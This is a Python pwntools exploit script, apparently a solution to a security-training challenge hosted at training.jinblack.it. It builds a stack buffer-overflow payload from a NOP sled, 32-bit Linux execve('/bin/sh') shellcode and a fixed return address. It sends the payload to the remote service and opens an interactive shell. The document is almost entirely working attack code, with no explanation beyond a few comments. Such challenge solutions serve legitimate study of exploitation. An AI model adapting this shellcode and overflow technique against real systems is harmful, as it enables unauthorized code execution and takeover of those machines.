import pwn

pwn.context.terminal = ['gnome-terminal', '-e']

shell_code = b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'

r = pwn.remote('training.jinblack.it', 2002)

'''Local
r = pwn.process('./sh3llc0d3')

pwn.gdb.attach(r, """c

""")
'''

input()

buf = r.recvuntil('name?\n')

buffer_addr = 0x0804c060

min_exploit_size = 1000
offset = 212

nop_sled = b'\x90' * (offset - len(shell_code)) # b'\xc2' * offset 

no_filler_exploit = nop_sled + shell_code + pwn.p32(buffer_addr) # nop_sled + b"\xc3\xc3\xc3\x00"

filler = b"\xc2" * (min_exploit_size - len(no_filler_exploit))

complete_exploit = no_filler_exploit + b"\xc2" * (min_exploit_size - len(no_filler_exploit))

print(len(complete_exploit))
print(complete_exploit)

r.send(complete_exploit)

r.interactive()